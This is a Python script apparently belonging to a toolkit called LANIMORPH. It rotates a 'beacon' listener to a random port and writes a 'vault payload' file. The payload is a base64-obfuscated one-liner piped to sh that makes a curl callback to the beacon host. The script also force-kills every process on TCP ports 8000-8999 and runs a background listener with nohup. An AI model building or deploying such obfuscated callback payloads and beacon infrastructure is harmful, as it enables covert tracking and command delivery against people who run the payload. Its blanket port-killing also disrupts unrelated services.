#!/usr/bin/env python3
import os, random, time, subprocess

VAULT = os.path.expanduser("~/LANIMORPH/vault/vault_drop.txt")
LOG = os.path.expanduser("~/LANIMORPH/chain/rotation_history.log")
WATCHER = os.path.expanduser("~/LANIMORPH/beacons/beacon_watch.py")

def get_local_ip():
    try:
        return subprocess.check_output("ip route get 1", shell=True).decode().split("src")[1].split()[0]
    except:
        return "127.0.0.1"

def kill_old_ports():
    for port in range(8000, 9000):
        subprocess.call(f"fuser -k {port}/tcp", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_new_beacon(port):
    os.environ["PORT"] = str(port)
    subprocess.Popen(
        f"cd ~/LANIMORPH/beacons && nohup python3 beacon_watch.py >/dev/null 2>&1 &",
        shell=True,
    )

def write_payload(ip, port):
    cmd = f"curl -s http://{ip}:{port}/beacon.png > /dev/null"
    b64 = subprocess.check_output(f"echo '{cmd}' | base64", shell=True).decode().strip()
    with open(VAULT, "w") as f:
        f.write(f"echo {b64} | base64 -d | sh")
    print(f"[✓] Vault payload updated: {VAULT}")

def log_rotation(ip, port):
    with open(LOG, "a") as f:
        f.write(f"[ROTATE @ {time.strftime('%Y-%m-%d %H:%M:%S')}] New beacon port: {port} on {ip}\n")
    print(f"[✓] Rotation logged — now listening on {port}")

def main():
    ip = get_local_ip()
    port = random.randint(8000, 8999)
    kill_old_ports()
    start_new_beacon(port)
    write_payload(ip, port)
    log_rotation(ip, port)

if __name__ == "__main__":
    main()
